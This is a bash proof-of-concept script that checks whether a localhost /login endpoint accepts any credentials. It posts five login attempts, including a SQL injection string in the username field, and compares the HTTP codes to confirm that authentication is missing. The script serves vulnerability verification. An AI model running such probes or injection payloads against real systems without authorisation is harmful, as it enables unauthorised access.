#!/bin/bash

# POC: Missing Authentication Implementation
# This script demonstrates that the /login endpoint accepts all requests
# without validating credentials, returning HTTP 302 for every attempt

TARGET="http://localhost:5000"
LOGIN_ENDPOINT="$TARGET/login"

echo "=================================================="
echo "POC: Missing Authentication Implementation"
echo "=================================================="
echo ""

# Test 1: Valid credentials (admin/admin)
echo "[*] Test 1: Attempting login with credentials (admin/admin)..."
RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$LOGIN_ENDPOINT" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
echo "    Response HTTP Code: $HTTP_CODE1"
echo ""

# Test 2: Invalid credentials (admin/wrongpassword)
echo "[*] Test 2: Attempting login with wrong password (admin/wrongpassword)..."
RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$LOGIN_ENDPOINT" \
  -d "username=admin&password=wrongpassword" \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
echo "    Response HTTP Code: $HTTP_CODE2"
echo ""

# Test 3: SQL injection attempt
echo "[*] Test 3: Attempting login with SQL injection payload..."
RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$LOGIN_ENDPOINT" \
  -d "username=admin' OR '1'='1&password=x" \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
echo "    Response HTTP Code: $HTTP_CODE3"
echo ""

# Test 4: Empty credentials
echo "[*] Test 4: Attempting login with empty credentials..."
RESPONSE4=$(curl -s -w "\n%{http_code}" -X POST "$LOGIN_ENDPOINT" \
  -d "username=&password=" \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n 1)
echo "    Response HTTP Code: $HTTP_CODE4"
echo ""

# Test 5: Random credentials
echo "[*] Test 5: Attempting login with random credentials..."
RESPONSE5=$(curl -s -w "\n%{http_code}" -X POST "$LOGIN_ENDPOINT" \
  -d "username=randomuser&password=randompass" \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE5=$(echo "$RESPONSE5" | tail -n 1)
echo "    Response HTTP Code: $HTTP_CODE5"
echo ""

# Analysis
echo "=================================================="
echo "ANALYSIS:"
echo "=================================================="

# Check if all responses are identical (all should be 302)
if [ "$HTTP_CODE1" = "$HTTP_CODE2" ] && [ "$HTTP_CODE2" = "$HTTP_CODE3" ] && \
   [ "$HTTP_CODE3" = "$HTTP_CODE4" ] && [ "$HTTP_CODE4" = "$HTTP_CODE5" ]; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    All requests received identical HTTP $HTTP_CODE1 response"
    echo "    Regardless of credentials provided (valid, invalid, SQL injection, empty)"
    echo "    This proves NO CREDENTIAL VALIDATION is being performed"
    echo ""
    
    if [ "$HTTP_CODE1" = "302" ]; then
        echo "[!] All requests are redirected (HTTP 302), indicating:"
        echo "    - No authentication logic is checking the credentials"
        echo "    - No user validation is occurring"
        echo "    - The login endpoint has no security controls"
        exit 0
    fi
fi

echo "[x] Vulnerability confirmation inconclusive"
exit 1